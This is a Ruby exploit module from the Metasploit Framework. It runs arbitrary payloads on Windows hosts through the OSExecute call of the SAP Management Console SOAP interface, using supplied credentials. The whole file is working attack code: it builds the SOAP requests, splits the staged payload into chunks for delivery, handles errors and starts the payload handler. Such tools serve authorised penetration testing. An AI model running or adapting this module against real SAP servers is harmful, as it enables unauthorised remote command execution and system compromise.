# $Id: sap_mgmt_con_osexec_payload.rb 14048 2011-10-24 16:42:07Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit4 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    HttpFingerprint = { :pattern => [ /gSOAP\/2.7/ ] }
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::CmdStagerVBS
    include Msf::Exploit::EXE
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;SAP Management Console OSExecute Payload Execution&#039;,
            &#039;Version&#039;        => &#039;$Revision: 14048 $&#039;,
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => [ &#039;Chris John Riley&#039; ],
            &#039;Description&#039;    => %q{
                    This module executes an arbitrary payload through the SAP Management Console
                SOAP Interface.  A valid username and password must be provided.
            },
            &#039;References&#039;     =>
                [
                    # General
                    [ &#039;URL&#039;, &#039;http://blog.c22.cc&#039; ]
                ],
            &#039;Privileged&#039;     => true,
            &#039;DefaultOptions&#039; =>
                {
                },
            &#039;Payload&#039;        =>
                {
                &#039;BadChars&#039; => "\x00\x3a\x3b\x3d\x3c\x3e\x0a\x0d\x22\x26\x27\x2f\x60\xb4",
                },
            &#039;Platforms&#039;      => [ &#039;win&#039; ],
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Windows Universal&#039;,
                        {
                            &#039;Arch&#039; => ARCH_X86,
                            &#039;Platform&#039; => &#039;win&#039;
                        },
                    ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Mar 08 2011&#039;
        ))
 
        register_options(
            [
                Opt::RPORT(50013),
                OptBool.new(&#039;VERBOSE&#039;, [ false, &#039;Enable verbose output&#039;, false ]),
                OptString.new(&#039;URI&#039;, [false, &#039;Path to the SAP Management Console &#039;, &#039;/&#039;]),
                OptString.new(&#039;USERNAME&#039;, [true, &#039;Username to use&#039;, &#039;&#039;]),
                OptString.new(&#039;PASSWORD&#039;, [true, &#039;Password to use&#039;, &#039;&#039;]),
            ], self.class)
        register_advanced_options(
            [
                OptInt.new(&#039;PAYLOAD_SPLIT&#039;, [true, &#039;Size of payload segments&#039;, &#039;7500&#039;]),
            ], self.class)
        register_autofilter_ports([ 50013 ])
    end
 
    def autofilter
        false
    end
 
    def exploit
        print_status("[SAP] Connecting to SAP Management Console SOAP Interface on #{rhost}:#{rport}")
        linemax = datastore[&#039;PAYLOAD_SPLIT&#039;] # Values over 9000 can cause issues
        print_status("Using custom payload size of #{linemax}") if linemax != 7500
        execute_cmdstager({ :delay => 0.35, :linemax => linemax })
        handler
    end
 
    # This is method required for the CmdStager to work...
    def execute_command(cmd, opts)
 
        soapenv = &#039;http://schemas.xmlsoap.org/soap/envelope/&#039;
        xsi = &#039;http://www.w3.org/2001/XMLSchema-instance&#039;
        xs = &#039;http://www.w3.org/2001/XMLSchema&#039;
        sapsess = &#039;http://www.sap.com/webas/630/soap/features/session/&#039;
        ns1 = &#039;ns1:OSExecute&#039;
 
        cmd_s = cmd.split("&") #Correct issue with multiple commands on a single line
        if cmd_s.length > 1
            print_status("Command Stager progress -  Split final payload for delivery (#{cmd_s.length} sections)")
        end
 
        cmd_s = cmd_s.collect(&:strip)
        cmd_s.each do |payload|
 
            data = &#039;<?xml version="1.0" encoding="utf-8"?>&#039; + "\r\n"
            data << &#039;<SOAP-ENV:Envelope xmlns:SOAP-ENV="&#039; + soapenv + &#039;"  xmlns:xsi="&#039; + xsi + &#039;" xmlns:xs="&#039; + xs + &#039;">&#039; + "\r\n"
            data << &#039;<SOAP-ENV:Header>&#039; + "\r\n"
            data << &#039;<sapsess:Session xlmns:sapsess="&#039; + sapsess + &#039;">&#039; + "\r\n"
            data << &#039;<enableSession>true</enableSession>&#039; + "\r\n"
            data << &#039;</sapsess:Session>&#039; + "\r\n"
            data << &#039;</SOAP-ENV:Header>&#039; + "\r\n"
            data << &#039;<SOAP-ENV:Body>&#039; + "\r\n"
            data << &#039;<&#039; + ns1 + &#039; xmlns:ns1="urn:SAPControl"><command>cmd /c &#039; + payload.strip
            data << &#039;</command><async>0</async></&#039; + ns1 + &#039;>&#039; + "\r\n"
            data << &#039;</SOAP-ENV:Body>&#039; + "\r\n"
            data << &#039;</SOAP-ENV:Envelope>&#039; + "\r\n\r\n"
 
            user_pass = Rex::Text.encode_base64(datastore[&#039;USERNAME&#039;] + ":" + datastore[&#039;PASSWORD&#039;])
 
            begin
                res = send_request_raw({
                    &#039;uri&#039;     => "/#{datastore[&#039;URI&#039;]}",
                    &#039;method&#039;  => &#039;POST&#039;,
                    &#039;data&#039;    => data,
                    &#039;headers&#039; =>
                        {
                            &#039;Content-Length&#039;  => data.length,
                            &#039;SOAPAction&#039;      => &#039;""&#039;,
                            &#039;Authorization&#039;   => &#039;Basic &#039; + user_pass,
                            &#039;Content-Type&#039;    => &#039;text/xml; charset=UTF-8&#039;,
                        }
                }, 60)
 
            if (res.code != 500 and res.code != 200)
                print_error("[SAP] An unknown response was received from the server")
                abort("Invlaid server response")
            elsif res.code == 500
                body = res.body
                if body.match(/Invalid Credentials/i)
                    print_error("[SAP] The Supplied credentials are incorrect")
                    abort("Exploit not complete, check credentials")
                elsif body.match(/Permission denied/i)
                    print_error("[SAP] The Supplied credentials are valid, but lack OSExecute permissions")
                    raise RuntimeError.new("Exploit not complete, check credentials")
                end
            end
 
            rescue ::Rex::ConnectionError
                print_error("[SAP] Unable to attempt authentication")
                break
            end
        end
    end
end



